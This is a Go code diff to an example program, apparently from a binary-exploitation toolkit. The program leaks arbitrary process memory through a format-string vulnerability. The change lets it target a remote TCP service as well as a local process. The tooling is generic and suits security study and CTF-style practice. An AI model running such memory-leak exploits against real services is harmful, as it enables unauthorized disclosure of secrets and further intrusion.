@@ -3,20 +3,32 @@ package main
 import (
 	"bufio"
 	"flag"
-	"github.com/stephen-fox/brkit/process"
 	"log"
 	"os"
 	"os/exec"
 	"strconv"
 	"strings"
+
+	"github.com/stephen-fox/brkit/process"
 )
 
 func main() {
+	verbose := flag.Bool("v", false, "Verbose output")
+
 	flag.Parse()
 
-	cmd := exec.Command(flag.Arg(0))
-	proc := process.ExecOrExit(cmd)
-	proc.SetLogger(log.New(log.Writer(), log.Prefix(), log.Flags()))
+	var proc *process.Process
+	if strings.Contains(flag.Arg(0), ":") {
+		proc = process.DialOrExit("tcp", flag.Arg(0))
+	} else {
+		cmd := exec.Command(flag.Arg(0))
+		proc = process.ExecOrExit(cmd)
+		log.Printf("pid: %d", cmd.Process.Pid)
+	}
+
+	if *verbose {
+		proc.SetLogger(log.New(log.Writer(), log.Prefix(), log.Flags()))
+	}
 
 	leaker := process.SetupFormatStringParamLeakerOrExit(process.FormatStringParamLeakerConfig{
 		GetProcessFn: func() *process.Process {
@@ -25,8 +37,6 @@ func main() {
 		MaxNumParams: 200,
 		PointerSize:  8,
 	})
-
-	log.Printf("pid: %d", cmd.Process.Pid)
 
 	log.Printf("please enter a memory address to read from followed by 'enter':\n")
 	pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
@@ -42,10 +52,7 @@ func main() {
 		log.Fatalln(err)
 	}
 
-	raw, err := leaker.MemoryAt(process.PointerMakerForX86().U64(pointer), proc)
-	if err != nil {
-		log.Fatalln(err)
-	}
+	raw := leaker.MemoryAtOrExit(process.PointerMakerForX86().U64(pointer), proc)
 
 	log.Printf("read: 0x%x", raw)
 }
